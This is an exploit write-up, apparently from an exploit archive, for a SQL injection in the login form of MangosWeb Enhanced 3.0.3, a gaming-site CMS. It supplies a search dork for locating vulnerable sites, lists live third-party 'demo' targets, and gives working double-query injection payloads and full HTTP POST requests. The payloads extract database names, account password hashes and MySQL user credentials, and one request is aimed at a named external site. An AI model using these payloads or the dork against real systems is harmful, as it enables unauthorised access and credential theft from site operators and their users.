@@ -1,0 +1,95 @@
+EXPLOIT TITLE: MangosWeb SQL Vulnerability
+DATE: 1/7/2012
+BY Hood3dRob1n
+AFFECTED PRODUCTS: MangosWeb Enhanced Version 3.0.3
+SW LINK: http://code.google.com/p/mwenhanced/
+CATEGORY: WebApp 0day
+DORK: intext:MangosWeb ENhanced Version 3.0.3 @2009-2011, KeysWow Dev Team
+TESTED ON: W7 & Backtrack 5
+DEMO1: http://wowfaction.selfip.com/wow/
+DEMO2: http://www.mojotrollz.eu/
+DEMO3: http://h1987786.stratoserver.net:8096/
+Greetz to: -DownFall, Zer0Pwn, zerofreak, ~!White!~, Dr. Hobo, ring0_, Pi  , and Greyerstring!
+
+Found SQL vulnerabilities in this CMS whcih seems to affect a large amount of online gaming sites. There is a SQL injection vulnerability in the Login field of the login form located at the top of the site pages. If you inject a single apostrophe (') into this field and pass anything you want in password field you can trigger the SQL Error message. It requires the use of double-query injection, using string method, over POST request to exploit this vulnerability which can lead to extraction of user info as well as databse user credentials. You can use Tamper Data, Live HTTP Headers to replicate the results but AI find it easiest to perform this type of injection from Burp Suite...
+
+Proof of Concept (PoC):
+You need to first get the name of the current database using this syntax injected into the Login field:
+
+'and(select 1 FROM(select count(*),concat((select (select concat(database())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+-
+
+Once we have that we can grab the authorized user details with this syntax injected into Login:
+
+'and+(select 1 FROM(select+count(*),concat((select+concat(0x3a,id,0x3a,username,0x3a,sha_pass_hash,0x3a) FROM TableName.account+LIMIT+N,1),floor(rand(0)*2))x FROM information_schema.tables+GROUP BY x)b)--+-
+
+NOTE: Replace the TableName with the results from the first injection, and then use the N position to enumerate the results for all entries. 
+
+Extraction of MySQL User Credentials requires one to inject the following syntax into the Login field:
+
+'and+(select 1 FROM(select+count(*),concat((select+concat(0x3a,host,0x3a,user,0x3a,password,0x3a,file_priv,0x3a,super_priv) FROM mysql.user+LIMIT+0,1),floor(rand(0)*2))x FROM information_schema.tables+GROUP BY x)b)--+-
+
+
+
+Examples:
+=====================================================================================================
+POST /?p=account&sub=login HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0.1) Gecko/20100101 Firefox/8.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Proxy-Connection: keep-alive
+Referer: http://127.0.0.1/?p=server&sub=chars
+Cookie: Language=English; cur_selected_realm=1; cur_selected_theme=0; cookies=true; menuCookie=1%201%200%200%200%201%200%200
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 244
+
+login='and(select 1 FROM(select count(*),concat((select (select concat(database())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+-&pass=fubar&action=login&x=0&y=0
+=====================================================================================================
+POST /?p=account&sub=login HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0.1) Gecko/20100101 Firefox/8.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Proxy-Connection: keep-alive
+Referer: http://127.0.0.1/?p=server&sub=chars
+Cookie: Language=English; cur_selected_realm=1; cur_selected_theme=0; cookies=true; menuCookie=1%201%200%200%200%201%200%200
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 244
+
+login='and+(select 1 FROM(select+count(*),concat((select+concat(0x3a,id,0x3a,username,0x3a,sha_pass_hash,0x3a) FROM tbc_realm.account+LIMIT+0,1),floor(rand(0)*2))x FROM information_schema.tables+GROUP BY x)b)--+-&pass=fubar&action=login&x=0&y=0
+=====================================================================================================
+POST /wow/?p=account&sub=login HTTP/1.1
+Host: wowfaction.selfip.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0.1) Gecko/20100101 Firefox/8.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Proxy-Connection: keep-alive
+Referer: http://wowfaction.selfip.com/wow/
+Cookie: Language=English; cur_selected_realm=1; cur_selected_theme=0; menuCookie=1%201%200%200%200%201%200%200; cookies=true; base_language_id=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 262
+
+login='and+(select 1 FROM(select+count(*),concat((select+concat(0x3a,host,0x3a,user,0x3a,password,0x3a,insert_priv,0x3a,file_priv,0x3a,super_priv) FROM mysql.user+LIMIT+0,1),floor(rand(0)*2))x FROM information_schema.tables+GROUP BY x)b)--+-&pass=fubar&action=login&x=0&y=0
+=====================================================================================================
+POST /?p=account&sub=login HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0.1) Gecko/20100101 Firefox/8.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Proxy-Connection: keep-alive
+Referer: http://127.0.0.1/?p=server&sub=chars
+Cookie: Language=English; cur_selected_realm=1; cur_selected_theme=0; cookies=true; menuCookie=1%201%200%200%200%201%200%200
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 273
+
+login='and+(select 1 FROM(select+count(*),concat((select+concat(0x3a,host,0x3a,user,0x3a,password,0x3a,insert_priv,0x3a,file_priv,0x3a,super_priv) FROM mysql.user+LIMIT+0,1),floor(rand(0)*2))x FROM information_schema.tables+GROUP BY x)b)--+-&pass=fubar&action=login&x=0&y=0
+=====================================================================================================
+
